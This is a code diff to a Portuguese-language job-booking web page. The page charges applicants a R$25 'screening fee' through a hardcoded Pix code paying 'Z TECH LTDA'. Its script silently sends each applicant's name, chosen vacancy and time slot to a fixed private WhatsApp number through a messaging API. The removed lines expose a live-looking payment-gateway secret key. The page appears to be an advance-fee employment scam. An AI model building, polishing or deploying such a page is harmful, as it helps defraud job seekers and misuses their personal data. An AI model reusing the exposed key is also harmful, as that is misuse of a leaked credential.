@@ -277,8 +277,7 @@
                 <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Taxa de Triagem</h3>
                 <p style="font-size: 14px; margin-top: 0; color: var(--text-muted);">Efetue o pagamento de <strong>R$ 25,00</strong> para confirmar sua presença e evitar ausências na agenda da empresa.</p>
                 
-                <!-- Código Pix Dinâmico da API -->
-                <div class="pix-code" id="codigo-pix">Gerando seu código Pix exclusivo...</div>
+                <div class="pix-code" id="codigo-pix">00020101021226830014br.gov.bcb.pix2561qrcode.owem.com.br/v2/qr/cob/ee3a27ed020242559adec811009c6f725204000053039865802BR5911Z TECH LTDA6009SAO PAULO62070503***6304CED2</div>
                 
                 <button class="btn-main" onclick="copiarPix()">Copiar Código Pix Copia e Cola</button>
 
@@ -602,7 +601,6 @@
 
         const horarioEscolhido = document.querySelector('input[name="horario_escolhido"]:checked').value;
         const nome = document.getElementById('nome').value.trim();
-        const whatsappNumeros = document.getElementById('whatsapp').value.replace(/\D/g, '');
         const vaga = vagasAtivas[vagaEscolhidaIndex];
 
         // 1. INTEGRAÇÃO DA API DO WHATSAPP TEXTMEBOT
@@ -612,11 +610,12 @@
         // Disparo fixo para o número de controle (5522992195418) usando HTTPS
         const urlApi = `https://api.textmebot.com/send.php?recipient=+5522992195418&apikey=${apiKey}&text=${encodeURIComponent(textoMsg)}`;
         
+        // Chamada via fetch (no-cors para não dar block visual no frontend)
         fetch(urlApi, { mode: 'no-cors' })
             .then(() => console.log('Sinal de API enviado para +5522992195418'))
             .catch(err => console.error('Erro no disparo WhatsApp:', err));
 
-        // 2. AVANÇAR DE TELA E GERAR PIX
+        // 2. AVANÇAR DE TELA
         document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0];
         document.getElementById('vaga-confirmacao').innerText = vaga.titulo;
         document.getElementById('horario-confirmacao').innerText = horarioEscolhido;
@@ -624,33 +623,6 @@
         document.getElementById('step-vagas').style.display = 'none';
         document.getElementById('step-pix').style.display = 'block';
         window.scrollTo({ top: 0, behavior: 'smooth' });
-
-        // API DO GATEWAY DO 7
-        const chaveGateway7 = "Gw7_live_ttituvMpOzWATtlRnJrFn5oYbhdXbdo-"; 
-        const idempotencyKey = "pix-" + Date.now() + "-" + whatsappNumeros;
-
-        fetch("https://api.gateway7.com/api/v1/pix", { 
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "Authorization": `Bearer ${chaveGateway7}`,
-                "Idempotency-Key": idempotencyKey
-            },
-            body: JSON.stringify({
-                amount: 2500, 
-                description: `Agendamento - ${vaga.titulo}`
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            const pixCopiaECola = data.payload || data.pix_link || data.qrcode_text || data.qr_code;
-            if(pixCopiaECola) {
-                document.getElementById("codigo-pix").innerText = pixCopiaECola;
-            }
-        })
-        .catch(error => {
-            console.error("Erro na API de Pix dinâmica:", error);
-        });
     }
 </script>
 
